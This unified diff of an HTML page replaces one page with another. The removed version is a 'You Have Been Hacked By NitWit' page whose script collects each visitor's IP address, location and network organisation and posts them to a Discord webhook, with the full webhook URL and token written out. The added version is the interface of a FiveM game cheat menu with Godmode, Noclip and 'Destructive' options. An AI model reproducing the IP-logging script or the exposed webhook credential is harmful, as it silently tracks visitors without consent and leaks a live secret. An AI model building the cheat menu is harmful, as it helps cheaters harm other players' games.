@@ -1,157 +1,722 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>NitWit</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-      background-size: cover;
-      font-family: 'Courier New', Courier, monospace;
-      color: #00ff00;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      text-align: center;
-      overflow: hidden;
-    }
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aura Menu - HTML Controlled</title> 
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
 
-    .image-container img {
-      width: 400px;
-      border-radius: 20px;
-      box-shadow: 0 0 25px rgba(0, 255, 0, 0.6);
-      animation: float 4s ease-in-out infinite;
-    }
+        html, body {
+            width: 100%;
+            height: 100%;
+            background-color: transparent !important; 
+            overflow: hidden;
+            font-family: 'Roboto', sans-serif;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
 
-    .marquee {
-      position: absolute;
-      top: 10%;
-      width: 100%;
-      overflow: hidden;
-      white-space: nowrap;
-    }
+        .menu-container {
+            width: 387px; 
+            height: 520px; 
+            background: rgba(0, 0, 0, 0.6); 
+            border-radius: 8px; 
+            box-shadow: 
+                0 4px 15px rgba(0, 0, 0, 0.4), 
+                inset 0 0 8px rgba(255, 255, 0, 0.08); 
+            overflow: hidden;
+            position: relative; 
+            display: flex;
+            flex-direction: column;
+            opacity: 1;
+            outline: none; /* إزالة outline عند التركيز */
+        }
+        
+        .menu-header {
+            height: 137px; 
+            background: linear-gradient(135deg, rgba(255, 255, 0, 0.95) 0%, rgba(200, 200, 0, 0.95) 100%); 
+            position: relative;
+            background-size: cover; 
+            background-position: center top; 
+            background-repeat: no-repeat;
+            border-top-left-radius: 7px; 
+            border-top-right-radius: 7px;
+            box-shadow: inset 0 -2px 6px rgba(255, 255, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.2); 
+        }
 
-    .marquee span {
-      display: inline-block;
-      font-size: 4em;
-      font-weight: bold;
-      color: #00ff00;
-      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
-      animation: scroll 12s linear infinite;
-    }
+        .header-home-text {
+            position: absolute; 
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #000000; 
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            font-size: 12px; 
+            font-weight: 600; 
+            text-transform: uppercase;
+            letter-spacing: 1px; 
+            text-align: center; 
+            padding: 8px; 
+            border-radius: 0; 
+            box-shadow: none; 
+        }
 
-    .info {
-      margin-top: 20px;
-      font-size: 1.3em;
-      color: #00ff00;
-      text-shadow: 0 0 10px #00ff00;
-      white-space: pre-wrap;
-      animation: fadeIn 2s ease-in forwards;
-    }
+        .menu-items {
+            padding: 4px 0;
+            height: calc(100% - 137px - 32px); 
+            overflow-y: hidden; 
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
 
-    .text {
-      margin-top: 20px;
-      font-size: 2.5em;
-      color: #00ff00;
-      text-shadow: 0 0 10px #00ff00;
-      animation: fadeIn 3s ease-in forwards;
-    }
+        .menu-items::-webkit-scrollbar {
+            display: none;
+        }
+        
+        .menu-item, .back-arrow-item {
+            display: flex;
+            align-items: center;
+            padding: 5px 12px;
+            margin: 0;
+            cursor: pointer;
+            position: relative;
+            min-height: 38px;
+            transition: none; 
+            z-index: 2;
+        }
 
-    @keyframes scroll {
-      0% { transform: translateX(100%); }
-      100% { transform: translateX(-100%); }
-    }
+        .menu-item:hover, .back-arrow-item:hover {
+            background: transparent;
+        }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
-    }
+        .menu-item.selected, .back-arrow-item.selected {
+            background: transparent; 
+            box-shadow: none; 
+            border-radius: 4px; 
+            transform: none; 
+            transition: none; 
+        }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-  </style>
+        .highlight-bar {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 38px;
+            background: rgba(255, 255, 0, 0.08); 
+            border-radius: 3px; 
+            z-index: 1; 
+            transition: top 0.2s ease-out;
+        }
+
+        .menu-item .icon, .back-arrow-item .icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            color: #d0d0d0; 
+            transition: none; 
+            position: relative;
+            z-index: 2;
+        }
+        
+        .menu-item.selected .icon, .back-arrow-item.selected .icon {
+            color: rgb(255, 255, 0); 
+        }
+
+        .menu-item .text, .back-arrow-item .text {
+            flex: 1;
+            font-family: 'Roboto', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            color: #f0f0f0; 
+            transition: none; 
+            position: relative;
+            z-index: 2;
+        }
+        
+        .menu-item.selected .text, .back-arrow-item.selected .text {
+            color: rgb(255, 255, 0); 
+        }
+
+        .menu-item .arrow {
+            position: relative;
+            z-index: 2;
+            color: #d0d0d0; 
+            transition: none; 
+        }
+
+        .menu-item.selected .arrow {
+            color: rgb(255, 255, 0); 
+        }
+
+        .toggle-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between; 
+            padding: 5px 12px;
+            margin: 0;
+            cursor: pointer;
+            position: relative;
+            min-height: 38px;
+            transition: none; 
+            z-index: 2;
+        }
+
+        .toggle-item:hover {
+            background: transparent;
+        }
+
+        .toggle-item.selected .toggle-text {
+            color: rgb(255, 255, 0); 
+        }
+
+        .toggle-item .toggle-text {
+            flex: 1;
+            font-family: 'Roboto', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            color: #f0f0f0; 
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px; 
+            height: 22px; 
+            border-radius: 11px;
+            background-color: rgba(100, 100, 100, 0.8); 
+            transition: background-color 0.2s ease-out, box-shadow 0.2s ease-out;
+            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.4); 
+            flex-shrink: 0; 
+        }
+
+        .toggle-switch::before {
+            content: '';
+            position: absolute;
+            width: 18px; 
+            height: 18px;
+            border-radius: 50%;
+            background-color: #fff; 
+            top: 2px;
+            left: 2px;
+            transition: transform 0.2s ease-out, background-color 0.2s ease-out;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4); 
+        }
+
+        .toggle-switch.on {
+            background-color: rgb(255, 255, 0); 
+            box-shadow: 0 0 8px rgba(255, 255, 0, 0.6), 0 0 10px rgba(255, 255, 0, 0.4); 
+        }
+
+        .toggle-switch.on::before {
+            transform: translateX(22px); 
+            background-color: #fff; 
+        }
+
+        .menu-footer {
+            background: rgba(8, 8, 8, 0.7); 
+            padding: 8px 16px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 11px;
+            color: #b0b0b0;
+            border-top: 1px solid rgba(255, 255, 0, 0.25); 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 32px;
+            border-bottom-left-radius: 7px; 
+            border-bottom-right-radius: 7px;
+        }
+
+        .menu-footer .version {
+            color: #b0b0b0;
+            font-weight: 500;
+        }
+
+        .menu-footer .counter {
+            background: rgba(255, 255, 0, 0.1); 
+            border-radius: 6px;
+            color: rgb(255, 255, 0); 
+            font-weight: 600;
+            font-size: 11px;
+            padding: 2px 5px;
+            box-shadow: 0 1px 3px rgba(255, 255, 0, 0.2); 
+        }
+
+        .notification-container {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 1000;
+        }
+
+        .notification {
+            background: rgba(25, 25, 25, 0.85); 
+            border: 1px solid rgba(255, 255, 0, 0.4); 
+            padding: 14px 18px; 
+            border-radius: 10px; 
+            min-width: 260px;
+            max-width: 320px;
+            box-shadow: 
+                0 6px 20px rgba(0, 0, 0, 0.5), 
+                0 0 0 1px rgba(255, 255, 255, 0.05); 
+            display: flex;
+            align-items: center;
+            animation: notificationFadeIn 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; 
+            opacity: 0;
+            transform: translateY(10px); 
+        }
+
+        .notification.fade-out {
+            animation: notificationFadeOut 0.25s cubic-bezier(0.55, 0.085, 0.68, 0.53) forwards; 
+        }
+
+        @keyframes notificationFadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @keyframes notificationFadeOut {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+        }
+
+        .notification-content {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+
+        .notification-icon {
+            font-size: 18px; 
+            margin-right: 10px; 
+            color: rgb(255, 255, 0); 
+            text-shadow: none; 
+            animation: none; 
+        }
+        
+        .notification-text {
+            flex: 1;
+        }
+
+        .notification-title {
+            font-family: 'Roboto', sans-serif;
+            font-size: 15px; 
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 2px; 
+            text-shadow: none; 
+        }
+
+        .notification-message {
+            font-family: 'Roboto', sans-serif;
+            font-size: 12px; 
+            font-weight: 500;
+            color: #d1d5db; 
+            text-shadow: none; 
+        }
+
+        .notification-timer {
+            width: 100%;
+            height: 2px; 
+            background: rgb(255, 255, 0); 
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            animation: timerProgress 4s linear forwards;
+            border-radius: 0 0 8px 8px; 
+        }
+
+        @keyframes timerProgress {
+            0% { width: 100%; }
+            100% { width: 0; }
+        }
+
+        /* إخفاء القائمة في البداية */
+        .menu-container.hidden {
+            display: none !important;
+        }
+    </style>
 </head>
 <body>
-  <div class="marquee">
-    <span>You Have Been Hacked By NitWit</span>
-  </div>
+    <div class="menu-container hidden" id="mainMenu" tabindex="0">
+        <div class="menu-header" id="menuHeader">
+            <div class="header-home-text" id="headerText">HOME</div> 
+        </div>
 
-  <div class="image-container">
-    <img src="https://cdn.discordapp.com/icons/742280886409756722/5f9b0d0fa781152b50b93e13dbf9b25f.webp?size=1024" alt="NitWit Icon">
-  </div>
+        <div class="menu-items" id="menuItemsContainer">
+            <div class="highlight-bar"></div>
+        </div>
 
-  <div class="info" id="ip-info">
-    {
-      "ip": "loading...",
-      "city": "",
-      "region": "",
-      "country": "",
-      "org": "",
-      "timezone": ""
-    }
-  </div>
+        <div class="menu-footer">
+            <span class="version">Version: HTML Controlled | 24hrs ago</span>
+            <span class="counter" id="counter">1/9</span> 
+        </div>
+    </div>
 
-  <div class="text">discord.gg/nww</div>
+    <div class="notification-container" id="notificationContainer"></div>
 
-  <script>
-    const webhookUrl = "https://canary.discord.com/api/webhooks/1391905386985947208/81seUYn_tudHFVXcCRqcaDEmDCmpPfnJyBFzFE3oHVt68noy9PzrW7hZdhhYfxbAY3li"; // ضع رابط الويب هوك هنا
+    <script>
+        // إعدادات أساسية
+        const bannerImageUrl = 'https://media.discordapp.net/attachments/1385473748068728922/1385879507289899148/Untitled12_20250621101005.png?ex=6857ac5e&is=68565ade&hm=d6b1c32143168757f493fcfe79cb7dad4849f8b56e7ca841ad23888219fe491e&=&format=webp&quality=lossless'; 
 
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        const info = {
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country,
-          loc: data.loc,
-          org: data.org,
-          timezone: data.timezone
-        };
+        let currentIndex = 0; 
+        let currentMenuType = 'main';
+        let isMenuVisible = false;
 
-        document.getElementById('ip-info').innerText = JSON.stringify(info, null, 2);
+        // عناصر DOM
+        const menuContainer = document.getElementById('mainMenu'); 
+        const headerText = document.getElementById('headerText'); 
+        const menuItemsContainer = document.getElementById('menuItemsContainer'); 
+        let highlightBar = document.querySelector('.highlight-bar'); 
+        const counterElement = document.getElementById('counter'); 
+        const notificationContainer = document.getElementById('notificationContainer');
 
-        const payload = {
-          content: "📡 IP Info from visitor:",
-          embeds: [{
-            title: "New Visitor Captured",
-            color: 65280,
-            fields: [
-              { name: "IP", value: data.ip || "N/A", inline: true },
-              { name: "City", value: data.city || "N/A", inline: true },
-              { name: "Region", value: data.region || "N/A", inline: true },
-              { name: "Country", value: data.country || "N/A", inline: true },
-              { name: "Org", value: data.org || "N/A", inline: false },
-              { name: "Timezone", value: data.timezone || "N/A", inline: true },
-              { name: "Location", value: data.loc || "N/A", inline: true }
-            ],
-            footer: {
-              text: "NitWit IP Logger"
+        // بيانات القوائم
+        const menuData = {
+            main: {
+                title: 'HOME',
+                items: [
+                    { name: "Self", icon: '<i class="fa-solid fa-user"></i>', desc: "Player Options", action: "self" },
+                    { name: "Online", icon: '<i class="fa-solid fa-desktop"></i>', desc: "Online Features", action: "online" },
+                    { name: "Combat/Weapons", icon: '<i class="fa-solid fa-crosshairs"></i>', desc: "Weapon System", action: "combat" },
+                    { name: "Visual", icon: '<i class="fa-solid fa-eye"></i>', desc: "Visual Effects", action: "visual" },
+                    { name: "Vehicle", icon: '<i class="fa-solid fa-car"></i>', desc: "Vehicle Menu", action: "vehicle" },
+                    { name: "Miscellaneous", icon: '<i class="fa-solid fa-folder-open"></i>', desc: "Other Options", action: "misc" },
+                    { name: "Destructive", icon: '<i class="fa-solid fa-bomb"></i>', desc: "Destruction Tools", action: "destructive" },
+                    { name: "Triggers", icon: '<i class="fa-solid fa-bolt"></i>', desc: "Event Triggers", action: "triggers" },
+                    { name: "Settings", icon: '<i class="fa-solid fa-gear"></i>', desc: "System Settings", action: "settings" }
+                ]
             },
-            timestamp: new Date().toISOString()
-          }]
+            self: {
+                title: 'SELF',
+                items: [
+                    { name: "Back", icon: '<i class="fa-solid fa-arrow-left"></i>', desc: "Return to Main Menu", action: "back" },
+                    { name: "Fast Run", action: "fastrun_toggle", type: "toggle", checked: false },
+                    { name: "Noclip", action: "noclip_toggle", type: "toggle", checked: false },
+                    { name: "Godmode", action: "godmode_toggle", type: "toggle", checked: false },
+                ]
+            }
         };
 
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        }).then(res => console.log("Sent to Discord:", res.status))
-          .catch(err => console.error("Webhook error:", err));
-      })
-      .catch(error => {
-        document.getElementById('ip-info').innerText = 'Unable to fetch IP.';
-        console.error('Fetch error:', error);
-      });
-  </script>
+        // وظائف القائمة الأساسية
+        function renderMenuItems(menuType) {
+            const currentMenuData = menuData[menuType];
+            let itemsHtml = '<div class="highlight-bar"></div>'; 
+
+            currentMenuData.items.forEach((item, index) => {
+                if (item.type === 'toggle') {
+                    itemsHtml += `
+                        <div class="toggle-item" data-index="${index}" data-action="${item.action}">
+                            <div class="toggle-text">${item.name}</div>
+                            <div class="toggle-switch ${item.checked ? 'on' : 'off'}"></div>
+                        </div>
+                    `;
+                } else {
+                    const itemClass = (item.action === 'back') ? 'back-arrow-item' : 'menu-item';
+                    itemsHtml += `
+                        <div class="${itemClass}" data-index="${index}" data-action="${item.action}">
+                            <div class="icon">${item.icon}</div>
+                            <div class="text">${item.name}</div>
+                            ${(item.action !== 'back') ? '<div class="arrow">»</div>' : ''}
+                        </div>
+                    `;
+                }
+            });
+            
+            menuItemsContainer.innerHTML = itemsHtml;
+            highlightBar = document.querySelector('.highlight-bar');
+            attachEventListeners();
+        }
+
+        function attachEventListeners() {
+            const renderedItems = document.querySelectorAll('#menuItemsContainer .menu-item, #menuItemsContainer .back-arrow-item, #menuItemsContainer .toggle-item');
+            
+            renderedItems.forEach((itemElement, index) => {
+                // Mouse hover
+                itemElement.addEventListener('mouseenter', function() {
+                    updateSelection(index);
+                });
+
+                // Mouse click
+                itemElement.addEventListener('click', function() {
+                    handleItemSelection(index);
+                });
+            });
+        }
+
+        function updateSelection(index) {
+            const currentItems = document.querySelectorAll('#menuItemsContainer .menu-item, #menuItemsContainer .back-arrow-item, #menuItemsContainer .toggle-item');
+            const totalItems = currentItems.length;
+
+            // إزالة التحديد السابق
+            if (currentItems[currentIndex]) {
+                currentItems[currentIndex].classList.remove('selected');
+            }
+            
+            // تحديد العنصر الجديد
+            currentIndex = Math.max(0, Math.min(index, totalItems - 1));
+
+            if (totalItems > 0 && currentIndex >= 0 && currentIndex < totalItems) {
+                currentItems[currentIndex].classList.add('selected');
+            }
+
+            // تحديث الـ highlight bar
+            if (highlightBar && totalItems > 0) {
+                const selectedElement = currentItems[currentIndex]; 
+                const topPosition = selectedElement.offsetTop; 
+                highlightBar.style.top = `${topPosition}px`; 
+                highlightBar.style.display = 'block';
+            }
+            
+            // تحديث العداد
+            counterElement.textContent = `${currentIndex + 1}/${totalItems}`;
+        }
+
+        function handleItemSelection(index) {
+            const selectedOption = menuData[currentMenuType].items[index];
+            if (!selectedOption) return;
+
+            updateSelection(index);
+
+            if (selectedOption.type === 'toggle') {
+                // Toggle switch
+                selectedOption.checked = !selectedOption.checked;
+                const toggleSwitch = document.querySelector(`[data-index="${index}"] .toggle-switch`);
+                if (toggleSwitch) {
+                    toggleSwitch.classList.toggle('on', selectedOption.checked);
+                    toggleSwitch.classList.toggle('off', !selectedOption.checked);
+                }
+
+                // إرسال للـ Lua
+                sendToLua('toggleAction', {
+                    action: selectedOption.action,
+                    state: selectedOption.checked,
+                    name: selectedOption.name
+                });
+
+                // إشعار
+                showNotification(
+                    selectedOption.checked ? `${selectedOption.name} Activated` : `${selectedOption.name} Deactivated`,
+                    selectedOption.checked ? `${selectedOption.name} mode enabled.` : `${selectedOption.name} mode disabled.`,
+                    selectedOption.checked ? '<i class="fa-solid fa-toggle-on"></i>' : '<i class="fa-solid fa-toggle-off"></i>'
+                );
+
+            } else if (selectedOption.action === 'back') {
+                navigateBack();
+            } else if (selectedOption.action === 'self') {
+                navigateToMenu('self');
+            } else {
+                // إرسال للـ Lua
+                sendToLua('menuSelected', {
+                    action: selectedOption.action,
+                    index: index,
+                    menu: currentMenuType,
+                    name: selectedOption.name
+                });
+
+                showNotification('Action Performed', `${selectedOption.name} was selected.`);
+            }
+        }
+
+        function navigateToMenu(menuType) {
+            if (menuData[menuType]) {
+                currentMenuType = menuType;
+                headerText.textContent = menuData[menuType].title;
+                renderMenuItems(currentMenuType);
+                updateSelection(0);
+            }
+        }
+
+        function navigateBack() {
+            if (currentMenuType === 'self') {
+                currentMenuType = 'main';
+                headerText.textContent = menuData.main.title;
+                renderMenuItems(currentMenuType);
+                const selfIndex = menuData.main.items.findIndex(item => item.action === 'self');
+                updateSelection(selfIndex >= 0 ? selfIndex : 0); 
+            }
+        }
+
+        function showNotification(title, message, iconHtml = '<i class="fa-solid fa-info-circle"></i>') {
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+
+            notification.innerHTML = `
+                <div class="notification-content">
+                    <div class="notification-icon">${iconHtml}</div> 
+                    <div class="notification-text">
+                        <div class="notification-title">${title}</div>
+                        <div class="notification-message">${message}</div>
+                    </div>
+                </div>
+                <div class="notification-timer"></div>
+            `;
+
+            notificationContainer.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.classList.add('fade-out');
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 250); 
+            }, 3000); 
+        }
+
+        function sendToLua(eventName, data) {
+            try {
+                if (typeof GetParentResourceName !== 'undefined') {
+                    fetch(`https://${GetParentResourceName()}/${eventName}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                        body: JSON.stringify(data)
+                    }).catch(error => console.error(`Error sending ${eventName}:`, error));
+                } else {
+                    console.log(`[DEBUG] ${eventName}:`, data);
+                }
+            } catch (error) {
+                console.error('Error in sendToLua:', error);
+            }
+        }
+
+        function showMenu() {
+            menuContainer.classList.remove('hidden');
+            menuContainer.focus(); // التركيز للحصول على keyboard events
+            isMenuVisible = true;
+            renderMenuItems(currentMenuType);
+            updateSelection(currentIndex);
+        }
+
+        function hideMenu() {
+            menuContainer.classList.add('hidden');
+            isMenuVisible = false;
+        }
+
+        // التحكم بالكيبورد المباشر من HTML
+        document.addEventListener('keydown', function(e) {
+            if (!isMenuVisible) return;
+
+            const currentItems = document.querySelectorAll('#menuItemsContainer .menu-item, #menuItemsContainer .back-arrow-item, #menuItemsContainer .toggle-item');
+            const totalItems = currentItems.length;
+
+            switch(e.key) {
+                case 'ArrowUp':
+                    e.preventDefault();
+                    if (totalItems > 0) {
+                        currentIndex = (currentIndex - 1 + totalItems) % totalItems;
+                        updateSelection(currentIndex);
+                    }
+                    break;
+                    
+                case 'ArrowDown':
+                    e.preventDefault();
+                    if (totalItems > 0) {
+                        currentIndex = (currentIndex + 1) % totalItems;
+                        updateSelection(currentIndex);
+                    }
+                    break;
+                    
+                case 'Enter':
+                    e.preventDefault();
+                    handleItemSelection(currentIndex);
+                    break;
+
+                case 'Backspace':
+                case 'Escape':
+                    e.preventDefault();
+                    if (currentMenuType !== 'main') {
+                        navigateBack();
+                    } else {
+                        sendToLua('hideMenu', {});
+                    }
+                    break;
+            }
+        });
+
+        // استقبال الرسائل من Lua
+        window.addEventListener('message', function(event) {
+            const data = event.data;
+            try {
+                switch(data.type) {
+                    case 'showMenu':
+                        showMenu();
+                        break;
+                        
+                    case 'hideMenu':
+                        hideMenu();
+                        break;
+                        
+                    case 'updateSelection':
+                        if (data.currentIndex !== undefined) {
+                            updateSelection(data.currentIndex);
+                        }
+                        break;
+                        
+                    case 'keyPressed':
+                        // محاكاة ضغط المفاتيح
+                        const keyEvent = new KeyboardEvent('keydown', { key: data.key });
+                        document.dispatchEvent(keyEvent);
+                        break;
+                        
+                    case 'showCustomNotification':
+                        showNotification(data.title || 'Notification', data.message || 'Custom message.', data.iconHtml);
+                        break;
+                        
+                    case 'setHeaderImage':
+                        const header = document.getElementById('menuHeader');
+                        if (header && data.imageUrl) {
+                            header.style.backgroundImage = `url('${data.imageUrl}')`;
+                        }
+                        break;
+                }
+            } catch (error) {
+                console.error('Error processing message from FiveM:', error);
+            }
+        });
+
+        // تهيئة القائمة
+        document.addEventListener('DOMContentLoaded', function() {
+            renderMenuItems('main');
+            updateSelection(0);
+            
+            // تطبيق الصورة الافتراضية
+            const header = document.getElementById('menuHeader');
+            if (header) {
+                header.style.backgroundImage = `url('${bannerImageUrl}')`;
+            }
+        });
+    </script>
 </body>
 </html>
